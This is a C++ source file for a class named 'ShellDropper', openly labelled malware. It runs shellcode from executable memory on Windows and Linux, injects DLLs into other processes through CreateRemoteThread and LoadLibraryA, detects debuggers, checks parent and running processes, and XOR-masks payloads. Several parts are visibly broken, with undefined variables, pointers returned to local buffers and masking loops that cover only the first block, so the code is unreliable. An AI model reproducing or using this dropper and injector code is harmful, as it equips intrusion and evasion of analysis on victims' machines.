#include "malware.hpp"
#include <iostream>
#include <memory>
#include <string.h>


#if WIN32 || _WIN32 || __WIN32 || _WIN64
#include <Windows.h>
bool ShellDropper::run_thread(){

    auto base_address = VirtualAlloc(nullptr, this->payload_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(base_address, this->payload_data.get(), this->payload_size);
    LPDWORD thread;
    HANDLE hanlder = CreateThread(nullptr, 0, (PTHREAD_START_ROUTINE)base_address, nullptr, CREATE_SUSPENDED, &thread);
    if(hanlder ==nullptr)
        return false;
    ResumeThread(hanlder); // start execution
    CloseHandle(handler);
    return true;
}

unsigned int ShellDropper::get_handler(char* process_name){

}

bool ShellDropper::inject_process(unsigned int  process_ID,char* dll_path){

    HANDLE handler = OpenProcess(PROCESS_VM_OPERATION|PROCESS_CREATE_THREAD , false, process_ID);
    if(handler == nullptr)
        return false;
    this->new_memory = VirtualAllocEx(handler, nullptr, strlen(dll_path)+1, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(handler, this->new_memory, dll_path, strlen(dll_path)+1, nullptr); // to include the '\0' as well
    HANDLE thread = CreateRemoteThread(handler, nullptr, nullptr, (LPTHREAD_START_ROUTINE)LoadLibraryA, this->new_memory, 0, nullptr);
    CloseHandle(thread);
    CloseHandle(handler);
    return true;
}


bool ShellDropper::run_in_process(unsigned int  process_ID){
    return true;
}

wchar_t* ShellDropper::GetParentName(){
	DWORD ppid = 0,selfid = GetCurrentProcessId();
	PROCESSENTRY32W processEntry = { 0 };
    wchar_t parentName[MAX_PATH + 1];
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32FirstW(hSnapshot, &processEntry))
	{
		do
		{
			if (processEntry.th32ProcessID == pid)
			{
				ppid = processEntry.th32ParentProcessID;
				break;
			}
		} while (Process32NextW(hSnapshot, &processEntry));
	}
	CloseHandle(hSnapshot);
    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
	QueryFullProcessImageNameW(hParent, 0, parentName, MAX_PATH);
	return parentName;
}

bool ShellDropper::CheckRunning(wchar_t* process){
    CharUpperW(process);
    PROCESSENTRY32W processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    wchar_t processName[MAX_PATH + 1];
    if (Process32FirstW(hSnapshot, &processEntry))
        do
        {
            StringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);
            CharUpperW(processName);
            if (wcsstr(processName, process))
                return true;
        } while (Process32NextW(hSnapshot, &processEntry));
    return false;
}

wchar_t* ShellDropper::CurrentUser(){
    DWORD userNameLength = UNLEN;
    wchar_t userName[UNLEN + 1];
    GetUserNameW(userName, &userNameLength);
    return userName;
}

bool ShellDropper::isDebuggerPresent(){
    //IsDebuggerPresent()
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    if (pPEB->BeingDebugged) 
        return true;

    //CheckRemoteDebuggerPresent()
    auto pNtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
    DWORD64 isDebugger = 0;
    pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &isDebugger, sizeof DWORD64, NULL);
    if (isDebugger) 
        return true;
}



#elif 	__linux__
#include <sys/mman.h>
#include <pthread.h>
bool ShellDropper::run_thread(){

    auto base_address = mmap(nullptr, this->payload_size,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(base_address, this->payload_data.get(),this->payload_size);
    pthread_t thread;
    int i = pthread_create(&thread, nullptr,(void* (*)(void*)) base_address, nullptr);

    if(i!=0)
        return false;
    pthread_detach(thread);
    return true;

}

unsigned int ShellDropper::get_handler(char* process_name){
    if(strlen(process_name)>0)
        return true;
    return 0;
}

bool ShellDropper::inject_process(unsigned int  process_ID,char* dll_path){
    if(strlen(dll_path)>0 && process_ID>0)
        return true;
    return true;
}

// to be defined
bool ShellDropper::run_in_process(unsigned int  process_ID){
    if(process_ID>0)
        return true;
    return true;
}


wchar_t* ShellDropper::GetParentName(){
    return nullptr;
}

bool ShellDropper::CheckRunning(wchar_t* process){
    if(process!= nullptr)
        return true;
    return false;
}
wchar_t* ShellDropper::CurrentUser(){
    return nullptr;

}
bool ShellDropper::isDebuggerPresent(){
    return true;

}


#else
#endif


ShellDropper::ShellDropper(){
    
}

ShellDropper::ShellDropper(const char* payload){
    this->payload_size = strlen(payload);
    this->payload_data = std::make_unique<char> (this->payload_size);
    char* tmp =this->payload_data.get();
    for(size_t i=0;i<this->payload_size;i++)
        tmp[i] = payload[i];

}

void ShellDropper::xoring(const  char* mask){
    size_t mask_len = strlen(mask),i,j;
    
    for (i = 0; i < this->payload_size; i+=mask_len){
        for (j = 0; j<mask_len;j++)
		    ((char*)this->new_memory)[j] = (((char*)this->new_memory)[j]) ^ mask[j];
    }
}

void ShellDropper::anding(const  char* mask){
    size_t mask_len = strlen(mask),i,j;
    
    for (i = 0; i < this->payload_size; i+=mask_len){
        for (j = 0; j<mask_len;j++)
		    ((char*)this->new_memory)[j] = (((char*)this->new_memory)[j]) & mask[j];
    }
}

void ShellDropper::oring(const  char* mask){
    size_t mask_len = strlen(mask),i,j;
    
    for (i = 0; i < this->payload_size; i+=mask_len){
        for (j = 0; j<mask_len;j++)
		    ((char*)this->new_memory)[j] = (((char*)this->new_memory)[j]) | mask[j];
    }
}

